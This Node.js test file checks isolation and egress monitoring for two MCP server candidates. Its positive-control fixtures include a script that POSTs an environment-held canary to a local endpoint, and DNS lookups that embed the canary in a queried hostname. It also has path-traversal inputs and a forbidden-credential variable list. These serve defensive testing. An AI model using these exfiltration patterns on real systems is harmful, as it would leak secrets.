// Tests for candidate isolation (plan §2). The named mutations, each proving a guard can fail:
//   * the scratch invariant rejects a path inside the repository;
//   * adding a forbidden credential variable back makes the environment assertion throw;
//   * a CJS-only dependency resolving from OUTSIDE the root fails the resolution check — run
//     against a real child process, because an ESM-only instrument would pass it;
//   * the opposite-SDK probe distinguishes anchor locations (an in-repo anchor resolves the
//     SDK, which is exactly why assembled roots outside the repository exist);
//   * the offline exfiltration channel can actually observe a canary that moves.

import { spawn } from "node:child_process";
import { createHash } from "node:crypto";
import { createServer } from "node:http";
import {
  mkdtempSync,
  mkdirSync,
  writeFileSync,
  rmSync,
  existsSync,
  readdirSync,
  readFileSync,
  realpathSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname, sep } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";
import test, { before, after } from "node:test";
import assert from "node:assert/strict";

import {
  ENV_ALLOWLIST,
  FORBIDDEN_ENV,
  REPO,
  assembleCandidateRoot,
  assertOutsideRepo,
  buildServerEnv,
  checkResolutions,
  resolveFromRoot,
  treeDigest,
  candidateTreeDigest,
  CANDIDATES,
} from "./isolate.mjs";
import { descendantsFor } from "./conformance.mjs";

const HERE = dirname(fileURLToPath(import.meta.url));

const roots = {};
before(() => {
  for (const candidate of ["v1", "v2"]) roots[candidate] = assembleCandidateRoot(candidate);
});
after(() => {
  for (const r of Object.values(roots)) r.cleanup();
});

// --- scratch invariant -------------------------------------------------------------------

test("the scratch invariant rejects a path inside the repository and accepts tmpdir", () => {
  assert.throws(() => assertOutsideRepo(join(REPO, ".story")), /inside the repository/);
  assert.throws(() => assertOutsideRepo(REPO), /inside the repository/, "the repo root itself must be rejected");
  assert.doesNotThrow(() => assertOutsideRepo(tmpdir()));
});

// --- environment allowlist ---------------------------------------------------------------

test("the constructed environment contains only allowlisted names plus explicit extras", () => {
  const env = buildServerEnv({ resolveLog: "/tmp/x.ndjson", extra: { SPENDBAR_TEST: "1" } });
  const permitted = new Set([...ENV_ALLOWLIST, "SPENDBAR_RESOLVE_LOG", "SPENDBAR_TEST"]);
  for (const name of Object.keys(env)) {
    assert.ok(permitted.has(name), `unexpected variable in constructed env: ${name}`);
  }
});

test("a parent-environment variable does not leak into the constructed environment", () => {
  process.env.SPENDBAR_PARENT_POLLUTION = "present";
  try {
    assert.ok(!("SPENDBAR_PARENT_POLLUTION" in buildServerEnv({ unaudited: "env-construction test" })));
  } finally {
    delete process.env.SPENDBAR_PARENT_POLLUTION;
  }
});

test("a forbidden credential variable present in the PARENT env never reaches the child", () => {
  process.env.GITHUB_TOKEN = "synthetic-parent-value-0000";
  try {
    assert.ok(!("GITHUB_TOKEN" in buildServerEnv({ unaudited: "env-construction test" })));
  } finally {
    delete process.env.GITHUB_TOKEN;
  }
});

test("mutation: adding a forbidden credential variable back makes the assertion throw", () => {
  for (const name of FORBIDDEN_ENV) {
    assert.throws(
      () => buildServerEnv({ unaudited: "env-construction test", extra: { [name]: "synthetic-0000" } }),
      new RegExp(name),
      `forbidden variable ${name} was accepted`,
    );
  }
});

// --- resolution checking -----------------------------------------------------------------

async function withTempDir(fn) {
  // Async-aware on purpose: a sync `finally` around an async callback deletes the fixture
  // while the callback is still using it (that exact bug cost test 9 and 14 a run).
  const dir = mkdtempSync(join(tmpdir(), "isolate-fixture-"));
  try {
    return await fn(dir);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}

test("checkResolutions flags CJS and ESM resolutions outside the root, allows builtins", async () => {
  await withTempDir((dir) => {
    const root = join(dir, "root");
    const outside = join(dir, "elsewhere.js");
    mkdirSync(root);
    writeFileSync(join(root, "inside.js"), "");
    writeFileSync(outside, "");
    const log = join(dir, "log.ndjson");
    writeFileSync(
      log,
      [
        JSON.stringify({ kind: "cjs", request: "fs", resolved: "fs" }),
        JSON.stringify({ kind: "esm", request: "node:path", resolved: "node:path" }),
        JSON.stringify({ kind: "cjs", request: "./inside.js", resolved: join(root, "inside.js") }),
        JSON.stringify({ kind: "cjs", request: "evil-dep", resolved: outside }),
        JSON.stringify({ kind: "esm", request: "evil-esm", resolved: `file://${outside}` }),
      ]
        .map((l) => l + "\n")
        .join(""),
    );
    const r = checkResolutions(log, root);
    assert.equal(r.total, 5);
    assert.equal(r.builtins, 2);
    assert.equal(r.inside, 1);
    assert.deepEqual(
      r.violations.map((v) => v.request).sort(),
      ["evil-dep", "evil-esm"],
    );
  });
});

test("a descendant execution context is recorded, and it is an isolation violation", async () => {
  // Everything the enumeration claims is about THIS process. A child or a Worker resolves its
  // own modules where the instrument was never loaded, so treating its absence from the log as
  // cleanliness would be reading "unobserved" as "observed nothing" (review round 1, chunk 16).
  await withTempDir(async (dir) => {
    const script = join(dir, "spawner.mjs");
    const log = join(dir, "resolve.ndjson");
    writeFileSync(
      script,
      // NAMED imports on purpose. Patching a property on the builtin's module object does not
      // touch the named exports Node already snapshotted, so this is precisely the shape that
      // created an unrecorded descendant while the resolution log still looked clean; only
      // syncBuiltinESMExports() in the instrument makes it observable (review round 2, chunk 6).
      'import { spawnSync } from "node:child_process";\nspawnSync("/usr/bin/true", []);\n' +
        'import { Worker } from "node:worker_threads";\n' +
        'const w = new Worker("", { eval: true });\nawait new Promise((r) => w.on("exit", r));\n',
    );
    const child = spawn(process.execPath, ["--import", join(HERE, "instrument.mjs"), script], {
      env: { SPENDBAR_RESOLVE_LOG: log, PATH: process.env.PATH },
      stdio: ["ignore", "ignore", "pipe"],
    });
    let stderr = "";
    child.stderr.on("data", (d) => (stderr += d));
    const closed = await awaitClose(child, 15_000);
    assert.equal(closed.code, 0, `spawner fixture failed (${closed.code}): ${stderr}`);

    assert.deepEqual(
      descendantsFor(log).map((d) => d.api).sort(),
      ["child_process.spawnSync", "worker_threads.Worker"],
      "the instrument did not record the execution contexts it cannot see into",
    );
    // And the resolution log itself stays a log of resolutions — no foreign record type in it,
    // which is why the descendant records go to a sidecar instead.
    const kinds = new Set(
      readFileSync(log, "utf8").split("\n").filter(Boolean).map((l) => JSON.parse(l).kind),
    );
    assert.ok(kinds.size > 0, "the instrument recorded no resolutions at all");
    for (const kind of kinds) assert.ok(["cjs", "esm"].includes(kind), `foreign record kind '${kind}' in the log`);
  });
});

test("the live candidate runs recorded zero violations and created no descendant", () => {
  // The positive side of the rule above, taken from the recorded matrix rather than restated:
  // every scripted case ran under the instrument, none resolved outside its root, and none
  // spawned anything — so the clause is a live invariant, and a breach of it already fails the
  // candidate's evidence (decide.test: "broken isolation invalidates the candidate's evidence
  // outright").
  const scripted = JSON.parse(readFileSync(join(HERE, "evidence", "scripted.json"), "utf8"));
  for (const candidate of ["v1", "v2"]) {
    const isolation = scripted[candidate].isolation;
    assert.equal(isolation.everyCaseInstrumented, true, `${candidate}: a case ran uninstrumented`);
    assert.deepEqual(isolation.descendants, [], `${candidate}: a case created an unobserved context`);
    const cases = Object.entries(isolation.perCase);
    assert.ok(cases.length > 0, `${candidate}: no instrumented cases recorded`);
    for (const [name, rec] of cases) {
      assert.ok(rec.total > 0, `${candidate}/${name}: instrumented but recorded no resolutions`);
      assert.equal(rec.violations, 0, `${candidate}/${name}: recorded ${rec.violations} violation(s)`);
      assert.equal(rec.descendants, 0, `${candidate}/${name}: recorded ${rec.descendants} descendant(s)`);
    }
  }
});

test("an empty resolution log is an error, not a pass", async () => {
  await withTempDir((dir) => {
    const log = join(dir, "log.ndjson");
    writeFileSync(log, "");
    assert.throws(() => checkResolutions(log, dir), /instrument did not run/);
  });
});

test("a malformed resolution log line is a hard error that names the log and the line", async () => {
  await withTempDir((dir) => {
    const log = join(dir, "log.ndjson");
    // A matcher-less assert.throws passed on ANY error — a typo inside checkResolutions
    // satisfied it just as well as the refusal it exists for. And what it accepted was a bare
    // SyntaxError naming a character position (review round 2, chunk 14).
    writeFileSync(log, '{"kind":"esm","resolved":"node:fs"}\n{not json\n');
    assert.throws(() => checkResolutions(log, dir), /resolution log .*log\.ndjson line 2 is not JSON/);
  });
});

test("mutation: a CJS-only dependency resolving from outside the root fails the live check", async () => {
  // The reason the instrument patches Module._resolveFilename: this fixture's require() never
  // touches the ESM resolve hook, so an ESM-only instrument would record nothing and the
  // check would report a clean run. Node resolution walks upward from root/ and finds the
  // planted package in the PARENT's node_modules — outside the root.
  await withTempDir(async (dir) => {
    const root = join(dir, "root");
    const dep = join(dir, "node_modules", "outside-dep");
    mkdirSync(root, { recursive: true });
    mkdirSync(dep, { recursive: true });
    writeFileSync(join(dep, "package.json"), JSON.stringify({ name: "outside-dep", version: "1.0.0", main: "index.js" }));
    writeFileSync(join(dep, "index.js"), "module.exports = 1;\n");
    // The explicit exit matters: the instrument's module.register() arms an ESM hooks thread,
    // and a CJS entry that never exercises it can leave the process alive on that idle thread.
    // The fixture's work (the recorded require) is synchronous and complete by this line.
    writeFileSync(join(root, "entry.cjs"), 'require("outside-dep");\nprocess.exit(0);\n');
    const log = join(dir, "resolve.ndjson");

    const child = spawn(
      process.execPath,
      ["--import", join(HERE, "instrument.mjs"), join(root, "entry.cjs")],
      { cwd: root, env: { SPENDBAR_RESOLVE_LOG: log }, stdio: ["ignore", "ignore", "pipe"] },
    );
    let stderr = "";
    child.stderr.on("data", (d) => (stderr += d));
    const code = await new Promise((resolve) => {
      const deadline = setTimeout(() => {
        child.kill("SIGKILL");
        resolve("timeout");
      }, 15_000);
      child.on("exit", (c) => {
        clearTimeout(deadline);
        resolve(c);
      });
    });
    assert.equal(code, 0, `fixture child failed (${code}): ${stderr}`);

    const r = checkResolutions(log, root);
    const flagged = r.violations.filter((v) => v.kind === "cjs" && v.request === "outside-dep");
    assert.equal(flagged.length, 1, "the CJS outside-root resolution was not flagged");
  });
});

// --- opposite-SDK probes on the assembled roots ------------------------------------------

test("each candidate root resolves its own SDK entry and MODULE_NOT_FOUNDs the opposite package", () => {
  // Positive controls use the exact specifiers the servers import — v1's bare name is dead in
  // the shipped artifact (next test), so probing it would "prove" absence of a present package.
  // Roots are realpathed because resolution returns realpaths (macOS /var -> /private/var).
  const v1Real = realpathSync(roots.v1.root);
  const own = resolveFromRoot(roots.v1.root, "@modelcontextprotocol/sdk/server/mcp.js");
  assert.ok(own.startsWith(v1Real + sep), "v1's own SDK resolved outside its root");
  assert.throws(() => resolveFromRoot(roots.v1.root, "@modelcontextprotocol/server"), { code: "MODULE_NOT_FOUND" });

  const v2Real = realpathSync(roots.v2.root);
  const own2 = resolveFromRoot(roots.v2.root, "@modelcontextprotocol/server");
  assert.ok(own2.startsWith(v2Real + sep), "v2's own SDK resolved outside its root");
  assert.throws(() => resolveFromRoot(roots.v2.root, "@modelcontextprotocol/sdk"), { code: "MODULE_NOT_FOUND" });
});

test("measured fact: v1 1.30.0's root '.' export maps to files absent from the shipped artifact", () => {
  // @modelcontextprotocol/sdk's exports map points '.' at dist/{esm,cjs}/index.js; the
  // published tarball ships NEITHER, so a bare-name import fails even where the package is
  // installed and its subpaths work. Pinned as a test so the decision document cites a
  // re-checkable fact; if a later SDK version ships the root entry, this fails and the
  // evidence gets updated rather than staying silently stale.
  assert.throws(() => resolveFromRoot(roots.v1.root, "@modelcontextprotocol/sdk"), { code: "MODULE_NOT_FOUND" });
  assert.doesNotThrow(() => resolveFromRoot(roots.v1.root, "@modelcontextprotocol/sdk/server/mcp.js"));
});

test("mutation: anchoring the probe at the in-repo workspace resolves the SDK — absence proofs need the assembled root", () => {
  // This is why §2 rejects the not-found probe as THE proof: an anchor inside the repository
  // can reach candidate (and potentially repo-root) node_modules. The probe only means
  // something from a root with no ancestor trees — which the previous tests use.
  const inRepo = resolveFromRoot(join(HERE, "candidates", "v1"), "@modelcontextprotocol/sdk/server/mcp.js");
  assert.ok(inRepo.includes(`${sep}node_modules${sep}`));
});

// --- tree digest --------------------------------------------------------------------------

test("a data: URL resolution is a violation, never a builtin", async () => {
  // Executable code from nowhere on disk — the checker must not wave it through.
  await withTempDir((dir) => {
    const log = join(dir, "log.ndjson");
    // One genuine in-root resolution alongside it, so what this test proves is that the data:
    // URL is a violation — not merely that a log with nothing inside the root is refused as
    // vacuous, which is a different guard with its own test.
    const real = join(dir, "server.mjs");
    writeFileSync(real, "export default 1\n");
    writeFileSync(
      log,
      JSON.stringify({ kind: "esm", request: "./server.mjs", resolved: pathToFileURL(real).href }) + "\n" +
        JSON.stringify({ kind: "esm", request: "x", resolved: "data:text/javascript,export default 1" }) + "\n",
    );
    const r = checkResolutions(log, dir);
    assert.equal(r.builtins, 0);
    assert.equal(r.inside, 1);
    assert.equal(r.violations.length, 1);
  });
});


test("an execution is either audited or says on the record that it is not", () => {
  // Instrumentation used to be optional BY OMISSION: `buildServerEnv({})` returned a valid
  // environment with no resolution log, so a candidate could run with none of its resolutions
  // recorded and no call site said so. That is how the real-client captures run — and it was
  // invisible. Not auditing is still allowed; being silent about it is not.
  assert.throws(() => buildServerEnv({}), /resolveLog|unaudited/);
  assert.throws(() => buildServerEnv(), /resolveLog|unaudited/);
  assert.doesNotThrow(() => buildServerEnv({ unaudited: "stated reason" }));
  assert.ok(!("SPENDBAR_RESOLVE_LOG" in buildServerEnv({ unaudited: "stated reason" })));
  assert.equal(buildServerEnv({ resolveLog: "/tmp/x.ndjson" }).SPENDBAR_RESOLVE_LOG, "/tmp/x.ndjson");
  // Claiming both is a contradiction about the same run, not a preference to resolve.
  assert.throws(() => buildServerEnv({ resolveLog: "/tmp/x.ndjson", unaudited: "why" }), /either audited or not/);
});

test("the real-client wrapper states its unaudited reason rather than omitting the log", () => {
  // The one production call site that does not audit. If it ever goes back to buildServerEnv({})
  // it will throw at capture time — but this catches it without spending a paid run.
  const src = readFileSync(join(HERE, "real-client", "capture-wrapper.mjs"), "utf8");
  assert.match(src, /buildServerEnv\(\{\s*unaudited:/);
});

test("a resolution log of nothing but builtins is vacuous, not clean", async () => {
  // The empty log was refused; this one was not, and it is just as uninformative. It proves the
  // instrument loaded and proves nothing about where the candidate's own closure came from.
  await withTempDir((dir) => {
    const log = join(dir, "log.ndjson");
    writeFileSync(
      log,
      [
        JSON.stringify({ kind: "esm", request: "node:path", resolved: "node:path" }),
        JSON.stringify({ kind: "cjs", request: "fs", resolved: "fs" }),
      ].map((l) => l + "\n").join(""),
    );
    assert.throws(() => checkResolutions(log, dir), /none inside the root/);
  });
});

test("a candidate name is validated before it reaches a path", () => {
  // `candidate` is interpolated into a repository path AND a mkdtemp prefix, and nothing
  // checked it: `..` reaches outside the candidates directory on the read side and outside the
  // intended temp subtree on the write side.
  for (const bad of ["../../etc", "v1/../..", "v3", "", "v1\u0000", "/absolute"]) {
    assert.throws(() => assembleCandidateRoot(bad), /unknown candidate/, JSON.stringify(bad));
    assert.throws(() => candidateTreeDigest(bad), /unknown candidate/, JSON.stringify(bad));
  }
  assert.deepEqual(CANDIDATES, ["v1", "v2"]);
});

test("mutation: treeDigest's record encoding is unambiguous — trees that COLLIDE under raw concatenation differ", async () => {
  // The defect class: an encoding that concatenates `F <path> <bytes>` records lets one file
  // whose contents embed a record collide with a tree where that record is a real second
  // file. The positive control below demonstrates the collision against that defective
  // encoding — so reverting treeDigest to it fails THIS test, not just a hypothetical
  // (review round 1: the previous fixture's fake record did not equal the old encoding's
  // real record, so the mutation was vacuous).
  await withTempDir((dir) => {
    const a = join(dir, "a");
    const b = join(dir, "b");
    mkdirSync(a);
    mkdirSync(b);
    writeFileSync(join(a, "x.txt"), "payload\nF y.txt different");
    writeFileSync(join(b, "x.txt"), "payload");
    writeFileSync(join(b, "y.txt"), "different");
    const rawConcatDigest = (root) => {
      const h = createHash("sha256");
      for (const name of readdirSync(root).sort()) {
        h.update(`F ${name} ${readFileSync(join(root, name))}\n`);
      }
      return h.digest("hex");
    };
    assert.equal(
      rawConcatDigest(a),
      rawConcatDigest(b),
      "fixture no longer reproduces the raw-concatenation collision — the control is dead",
    );
    assert.notEqual(treeDigest(a), treeDigest(b));
  });
});

test("treeDigest is order-stable and byte-sensitive", async () => {
  await withTempDir((dir) => {
    const a = join(dir, "a");
    const b = join(dir, "b");
    for (const d of [a, b]) {
      mkdirSync(join(d, "nested"), { recursive: true });
      writeFileSync(join(d, "x.txt"), "same");
      writeFileSync(join(d, "nested", "y.txt"), "same");
    }
    assert.equal(treeDigest(a), treeDigest(b));
    writeFileSync(join(b, "nested", "y.txt"), "diff");
    assert.notEqual(treeDigest(a), treeDigest(b));
  });
});

// --- offline exfiltration observation (§2's replacement for the credential canary) ---------
//
// The asserted claim, stated precisely (review round 1): during a full probe exchange the
// candidate makes NO egress attempt through Node's network APIs (net/dgram/dns/fetch — the
// net-observe.mjs preload records every attempt), and the canary value appears in neither
// stdio stream. Native-addon egress is outside this observer's reach and is precluded
// separately by the supply-chain gate (no native-build machinery in either closure). The
// positive control moves a canary through the SAME preload, proving the channel records.

const CANARY = "spendbar-canary-value-000000";
const NET_OBSERVE = join(HERE, "net-observe.mjs");

function startMock() {
  return new Promise((resolve) => {
    const hits = [];
    const server = createServer((req, res) => {
      let body = "";
      req.on("data", (d) => (body += d));
      req.on("end", () => {
        hits.push({ url: req.url, body });
        res.end("ok");
      });
    });
    server.listen(0, "127.0.0.1", () => {
      resolve({
        url: `http://127.0.0.1:${server.address().port}`,
        hits,
        close: () => new Promise((done) => server.close(done)),
      });
    });
  });
}

/** Await 'close' under a deadline; on deadline, SIGKILL and report timedOut — the CALLER
 *  decides that a timeout fails the test. Never treats a kill as a clean exit. */
function awaitClose(child, timeoutMs) {
  return new Promise((resolve) => {
    let timedOut = false;
    const timer = setTimeout(() => {
      timedOut = true;
      child.kill("SIGKILL");
    }, timeoutMs);
    child.once("close", (code, signal) => {
      clearTimeout(timer);
      resolve({ code, signal, timedOut });
    });
  });
}

/**
 * Egress attempts recorded by net-observe, WITHOUT its startup sentinel — and refusing a log
 * that has no sentinel at all.
 *
 * The observer writes one sentinel line before it patches anything (review round 2, chunk 6).
 * Its absence used to be indistinguishable from "nothing tried to reach the network": an
 * observer that never started, or could not write, produced exactly the empty log that a clean
 * run produces. Reading the log through this function is what makes the difference visible.
 */
const NET_SENTINEL = "net-observe/1 started";
const netAttempts = (logPath) => {
  const lines = existsSync(logPath)
    ? readFileSync(logPath, "utf8").split("\n").filter((l) => l.trim() !== "")
    : [];
  const sentinels = lines.filter((l) => l.includes(NET_SENTINEL));
  assert.equal(sentinels.length, 1, `net-observe did not record its startup sentinel in ${logPath}`);
  return lines.filter((l) => !l.includes(NET_SENTINEL));
};



test("a missing descendant sidecar is unobserved, not 'no descendants'", async () => {
  // Absence used to mean all three of "none were created", "the instrument never ran" and "the
  // sidecar could not be written", and the reader resolved it in favour of clean. The instrument
  // creates it EMPTY before anything can spawn, so absence now means the observation is broken.
  assert.throws(() => descendantsFor(join(tmpdir(), "no-such-resolve-log.ndjson")), /did not run/);

  await withTempDir(async (dir) => {
    // A run under the instrument that spawns NOTHING must still leave the witness behind, or
    // every honest run would be indistinguishable from an unobserved one.
    const script = join(dir, "quiet.mjs");
    const log = join(dir, "resolve.ndjson");
    writeFileSync(script, 'import { join } from "node:path";\njoin("a", "b");\n');
    const child = spawn(process.execPath, ["--import", join(HERE, "instrument.mjs"), script], {
      env: { SPENDBAR_RESOLVE_LOG: log, PATH: process.env.PATH },
      stdio: ["ignore", "ignore", "pipe"],
    });
    let stderr = "";
    child.stderr.on("data", (d) => (stderr += d));
    const closed = await awaitClose(child, 15_000);
    assert.equal(closed.code, 0, `quiet fixture failed (${closed.code}): ${stderr}`);
    assert.deepEqual(descendantsFor(log), [], "a run that spawned nothing did not leave an empty witness");
  });
});

test("the observers do not change the constructor semantics of what they observe", async () => {
  // Replacing Worker with a plain function made it callable without `new`, made a subclass
  // construct an OriginalWorker instead of the subclass, and dropped static properties. An
  // observer that alters the thing it observes has invalidated the run it reports on.
  await withTempDir(async (dir) => {
    const script = join(dir, "worker-semantics.mjs");
    writeFileSync(
      script,
      'import { Worker } from "node:worker_threads";\n' +
        'class MyWorker extends Worker {}\n' +
        'const w = new MyWorker("", { eval: true });\n' +
        'if (!(w instanceof MyWorker)) { console.error("subclass lost"); process.exit(3); }\n' +
        'if (!(w instanceof Worker)) { console.error("instanceof lost"); process.exit(4); }\n' +
        'let threw = false;\n' +
        'try { Worker("", { eval: true }); } catch { threw = true; }\n' +
        'if (!threw) { console.error("callable without new"); process.exit(5); }\n' +
        'await new Promise((r) => w.on("exit", r));\n',
    );
    const netLog = join(dir, "net-semantics.ndjson");
    const child = spawn(process.execPath, ["--import", NET_OBSERVE, script], {
      env: { SPENDBAR_TEST_CANARY: CANARY, SPENDBAR_NET_LOG: netLog, PATH: process.env.PATH },
      stdio: ["ignore", "ignore", "pipe"],
    });
    let stderr = "";
    child.stderr.on("data", (d) => (stderr += d));
    const closed = await awaitClose(child, 15_000);
    assert.equal(closed.code, 0, `worker semantics changed under observation (${closed.code}): ${stderr}`);
    // And it was still observed while behaving correctly.
    assert.match(netAttempts(netLog).join("\n"), /"worker_threads\.Worker"/);
  });
});

test("an unwritable egress log stops the call rather than letting it through unrecorded", async () => {
  // `record` swallowed every append failure and then ran the network call anyway, so a full or
  // unwritable log filesystem produced real egress and an empty log — which reads as clean. A
  // positive control that succeeded earlier cannot prove THIS record was written.
  await withTempDir(async (dir) => {
    const script = join(dir, "unwritable.mjs");
    // The log is writable at preload — the sentinel lands — and becomes unwritable before the
    // egress attempt. That isolates the PER-RECORD append failure, which is the mid-run
    // disk-full case; a log unwritable from the start is already caught by the sentinel write.
    writeFileSync(
      script,
      'import { chmodSync } from "node:fs";\n' +
        'import net from "node:net";\n' +
        'chmodSync(process.env.SPENDBAR_NET_LOG, 0o444);\n' +
        'let threw = false;\n' +
        'try { new net.Socket().connect(9, "127.0.0.1"); } catch { threw = true; }\n' +
        'process.exit(threw ? 0 : 7);\n',
    );
    const netLog = join(dir, "unwritable-log.ndjson");
    const child = spawn(process.execPath, ["--import", NET_OBSERVE, script], {
      env: { SPENDBAR_TEST_CANARY: CANARY, SPENDBAR_NET_LOG: netLog, PATH: process.env.PATH },
      stdio: ["ignore", "ignore", "pipe"],
    });
    let stderr = "";
    child.stderr.on("data", (d) => (stderr += d));
    const closed = await awaitClose(child, 15_000);
    // Either the connect threw inside the observer (exit 0 from the script's own check) or the
    // preload itself refused to start. Both are fail-closed; what must NOT happen is exit 7,
    // which means the socket connected with nothing recorded.
    assert.notEqual(closed.code, 7, `egress proceeded with an unwritable log: ${stderr}`);
  });
});

test("a full probe exchange makes no Node-API egress attempt and moves no canary into any stream", async () => {
  const mock = await startMock();
  try {
    await withTempDir(async (dir) => {
      for (const candidate of ["v1", "v2"]) {
        const { root, resolveLog } = roots[candidate];
        const netLog = join(dir, `net-${candidate}.ndjson`);
        const env = buildServerEnv({
          resolveLog,
          extra: { SPENDBAR_TEST_CANARY: CANARY, SPENDBAR_NET_LOG: netLog },
        });
        const child = spawn(process.execPath, ["--import", NET_OBSERVE, "server.mjs"], {
          cwd: root,
          env,
          stdio: ["pipe", "pipe", "pipe"],
        });
        let out = "";
        let err = "";
        child.stdout.on("data", (d) => (out += d));
        child.stderr.on("data", (d) => (err += d));
        child.stdin.write(
          JSON.stringify({ jsonrpc: "2.0", id: 1, method: "initialize", params: { protocolVersion: "2025-06-18", capabilities: {}, clientInfo: { name: "exfil-test", version: "0" } } }) + "\n",
        );
        child.stdin.write(JSON.stringify({ jsonrpc: "2.0", method: "notifications/initialized" }) + "\n");
        child.stdin.write(
          JSON.stringify({ jsonrpc: "2.0", id: 2, method: "tools/call", params: { name: "spendbar_probe", arguments: { nonce: "exfil" } } }) + "\n",
        );
        await new Promise((resolve) => setTimeout(resolve, 2000));
        child.stdin.end();
        // A timeout or unclean exit FAILS: a child SIGKILLed mid-outbound-request must never
        // read as "no egress happened" (review round 1).
        const closed = await awaitClose(child, 5000);
        assert.equal(closed.timedOut, false, `${candidate}: server did not exit after client EOF`);
        assert.equal(closed.code, 0, `${candidate}: server exited ${closed.code}/${closed.signal}, expected 0`);
        assert.ok(out.includes('"exfil"'), `${candidate}: exchange did not complete`);
        assert.ok(!out.includes(CANARY), `${candidate}: canary appeared on stdout`);
        assert.ok(!err.includes(CANARY), `${candidate}: canary appeared on stderr`);
        assert.deepEqual(
          netAttempts(netLog),
          [],
          `${candidate}: the server attempted network egress`,
        );
      }
    });
    assert.equal(mock.hits.length, 0, `local endpoint was contacted: ${JSON.stringify(mock.hits)}`);
  } finally {
    await mock.close();
  }
});

test("positive control: a child that DOES move the canary is recorded by the same preload and endpoint", async () => {
  // Without this, empty attempt logs above could mean the observer never armed. The control
  // uses the identical --import interception path AND proves real delivery at the endpoint.
  const mock = await startMock();
  try {
    await withTempDir(async (dir) => {
      const script = join(dir, "exfiltrate.mjs");
      const netLog = join(dir, "net-positive.ndjson");
      writeFileSync(
        script,
        'await fetch(process.env.SPENDBAR_EXFIL_URL, { method: "POST", body: process.env.SPENDBAR_TEST_CANARY });\n',
      );
      const child = spawn(process.execPath, ["--import", NET_OBSERVE, script], {
        env: { SPENDBAR_TEST_CANARY: CANARY, SPENDBAR_EXFIL_URL: mock.url, SPENDBAR_NET_LOG: netLog },
        stdio: ["ignore", "ignore", "pipe"],
      });
      let stderr = "";
      child.stderr.on("data", (d) => (stderr += d));
      const closed = await awaitClose(child, 10_000);
      assert.equal(closed.timedOut, false, "positive-control child hung");
      assert.equal(closed.code, 0, `positive-control child failed (${closed.code}): ${stderr}`);
      const attempts = netAttempts(netLog);
      assert.ok(attempts.length > 0, "the preload recorded no attempt for a child that did egress");
      assert.ok(attempts.some((l) => l.includes('"fetch"')), "the fetch entry point was not recorded");
    });
    assert.equal(mock.hits.length, 1);
    assert.ok(mock.hits[0].body.includes(CANARY), "the endpoint saw a request but not the canary");
  } finally {
    await mock.close();
  }
});

test("positive control: DNS-only and descendant egress paths are recorded too", async () => {
  // Both were unobserved until review round 1, chunk 16. A TXT lookup puts a caller-chosen name
  // on the wire without any socket the old patches touched; a child process or a Worker leaves
  // this process's API surface altogether. Each needs its own control, because an empty attempt
  // log is only evidence if the path being claimed clean is a path the observer can see.
  await withTempDir(async (dir) => {
    const cases = [
      {
        name: "dns.resolveTxt",
        source:
          'import { promises as dns } from "node:dns";\n' +
          'try { await dns.resolveTxt(`${process.env.SPENDBAR_TEST_CANARY}.invalid`); } catch {}\n',
        expect: /"dns\.promises\.resolveTxt"/,
      },
      {
        name: "dns.Resolver",
        source:
          'import { Resolver } from "node:dns";\n' +
          'new Resolver().resolve4(`${process.env.SPENDBAR_TEST_CANARY}.invalid`, () => {});\n',
        expect: /"dns\.Resolver\.resolve4"/,
      },
      {
        // A NAMED import, which holds the original function and never touches the patched
        // module property — the async funnel is what catches it.
        name: "child_process-named-import",
        source:
          'import { spawn } from "node:child_process";\n' +
          'const c = spawn("/usr/bin/true", []);\nawait new Promise((r) => c.on("close", r));\n',
        expect: /"child_process\.ChildProcess\.spawn"/,
      },
      {
        name: "child_process-namespace",
        source: 'import cp from "node:child_process";\ncp.spawnSync("/usr/bin/true", []);\n',
        expect: /"child_process\.spawnSync"/,
      },
      {
        name: "worker_threads-namespace",
        source:
          'import wt from "node:worker_threads";\n' +
          'const w = new wt.Worker("", { eval: true });\nawait new Promise((r) => w.on("exit", r));\n',
        expect: /"worker_threads\.Worker"/,
      },
      // The four paths below were documented as UNOBSERVABLE from inside the process, needing
      // Node's permission model to close. That was wrong (review round 2, chunk 6): patching a
      // property on a builtin's module object does not touch the named exports Node already
      // snapshotted, and `syncBuiltinESMExports()` pushes them through. Shown directly — with
      // the property patched and nothing else, a named import records NOTHING; with the sync
      // call, it records. Each of these is a path the observer previously stayed silent on.
      {
        name: "child_process-named-spawnSync",
        source: 'import { spawnSync } from "node:child_process";\nspawnSync("/usr/bin/true", []);\n',
        expect: /"child_process\.spawnSync"/,
      },
      {
        name: "child_process-named-execFileSync",
        source: 'import { execFileSync } from "node:child_process";\nexecFileSync("/usr/bin/true", []);\n',
        expect: /"child_process\.execFileSync"/,
      },
      {
        name: "worker_threads-named-import",
        source:
          'import { Worker } from "node:worker_threads";\n' +
          'const w = new Worker("", { eval: true });\nawait new Promise((r) => w.on("exit", r));\n',
        expect: /"worker_threads\.Worker"/,
      },
      {
        // The DNS case that motivated recording the whole resolver surface in round 1 — reached
        // through the import style that walked past every patch until now. It needs no socket
        // through any patched method, so an unobserved resolveTxt is a clean-looking exfiltration.
        name: "dns-named-resolveTxt",
        source:
          'import { resolveTxt } from "node:dns";\n' +
          'await new Promise((r) => resolveTxt(`${process.env.SPENDBAR_TEST_CANARY}.invalid`, () => r()));\n',
        expect: /"dns\.resolveTxt"/,
      },
    ];

    for (const c of cases) {
      const script = join(dir, `${c.name.replace(/\W/g, "-")}.mjs`);
      const netLog = join(dir, `net-${c.name.replace(/\W/g, "-")}.ndjson`);
      writeFileSync(script, c.source);
      const child = spawn(process.execPath, ["--import", NET_OBSERVE, script], {
        env: { SPENDBAR_TEST_CANARY: CANARY, SPENDBAR_NET_LOG: netLog, PATH: process.env.PATH },
        stdio: ["ignore", "ignore", "pipe"],
      });
      let stderr = "";
      child.stderr.on("data", (d) => (stderr += d));
      const closed = await awaitClose(child, 15_000);
      assert.equal(closed.timedOut, false, `${c.name}: control child hung`);
      assert.equal(closed.code, 0, `${c.name}: control child failed (${closed.code}): ${stderr}`);
      const attempts = netAttempts(netLog).join("\n");
      assert.match(attempts, c.expect, `${c.name}: the observer recorded nothing for this path`);
    }
  });
});
